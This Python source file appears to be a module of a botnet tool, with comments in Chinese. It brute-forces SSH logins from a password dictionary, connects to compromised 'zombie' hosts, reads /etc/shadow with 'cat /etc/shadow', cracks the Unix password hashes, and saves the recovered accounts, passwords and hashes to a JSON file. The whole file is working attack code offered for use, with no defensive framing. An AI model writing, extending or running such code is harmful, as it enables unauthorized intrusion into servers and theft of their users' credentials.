#!/usr/bin/env python3
# coding=utf-8
__author__ = "riverchu"

import os
import json
import global_var as gv
import threading
import time
from brute import bruteSSH, botNet, bruteUnixPasswd


def brute(host, user, dictionary, *, connections):
    """调用并进行破解

    :param host:破解目标主机
    :param user:目标用户
    :param dictionary:字典路径
    :param connections:连接数
    :return:
    """
    target = (host, user)
    dic = dict()
    dic['passwd_file'] = dictionary
    dic['max_connection'] = connections

    brute_ret = bruteSSH.brute_ssh(*target, **dic)
    return brute_ret


def crack_bot_unix_passwd(ip, passwd_file_info):
    if passwd_file_info is None or passwd_file_info == '':
        return None

    # 记录密码文件
    pass_bruteinfo = dict()
    pass_bruteinfo['ip'] = ip
    pass_bruteinfo['account'] = {}
    if passwd_file_info:
        # 破解密码文件内密码
        for line in passwd_file_info.split('\n'):
            if len(line) < 4:
                continue
            passwd_info = bruteUnixPasswd.crack_unix_passwd(line, dic=gv.PASS_DICTIONARY)
            if passwd_info['user'] != 'BannedUser':
                pass_bruteinfo['account'][passwd_info['user']] = {}
                pass_bruteinfo['account'][passwd_info['user']]['password'] = passwd_info['password']
                pass_bruteinfo['account'][passwd_info['user']]['hash'] = line

        save_info(mode='crack_unix_passwd', filename=gv.BOT_PATH + gv.bot_info_file, info=pass_bruteinfo, ip=ip)


def get_unix_passwdfile(bot):
    cmd_getpass = 'cat /etc/shadow'
    passwd_file_info = bot.send_command(cmd_getpass)
    return passwd_file_info


def standard_operate_bot(bot, host):
    """肉鸡标准操作

    :param bot: class
    :param host: host
    :return:
    """
    if bot.connected is False:
        return

    # 破解unix密码
    passwd_file_info = get_unix_passwdfile(bot)
    t = threading.Thread(target=crack_bot_unix_passwd, args=(host, passwd_file_info))
    bot.close_connection()
    t.start()
    t.join()


def operate_bot(brute_info):
    """登录肉鸡，并操作

    :param brute_info:登录信息{'host': '1.2.3.4', 'user': 'root', 'ssh_type': 'password', 'key': None}
    :return:
    """
    brute_info.pop('time')
    bot = botNet.BotClient(**brute_info)
    bot.connect()
    if bot.connected is True:
        standard_operate_bot(bot, brute_info['host'])


def save_info(mode, filename, info, **kw):
    """存储信息

    :param mode:模式
    :param filename:存储文件名
    :param info:存储信息
    :param kw:附加信息
    :return:
    """
    if mode == 'scan_log':
        with open(filename, 'a') as logfile:
            json.dump(info, logfile)
            logfile.write('\n')
    elif mode == 'crack_unix_passwd':
        # 需要加锁
        if os.path.exists(filename):
            bot_info = json.load(open(filename, 'r'))
        else:
            bot_info = {}
        if 'ip' in kw:
            bot_info[info['ip']] = info
        json.dump(bot_info, open(filename, 'w'), indent=4)
    else:
        return None


def read_files(filename, path=gv.BOT_PATH):
    """读取原破解结果

    :param filename:
    :param path:
    :return:
    """
    if os.path.exists(path):
        bot_info = json.load(open(gv.BOT_PATH + filename, 'r'))
        return bot_info


if __name__ == '__main__':
    mess = json.load(open(gv.BOT_PATH + gv.bot_info_file, 'r'))
    # mess = read_files(bot_FILE)
    print(json.dumps(mess, indent=4))
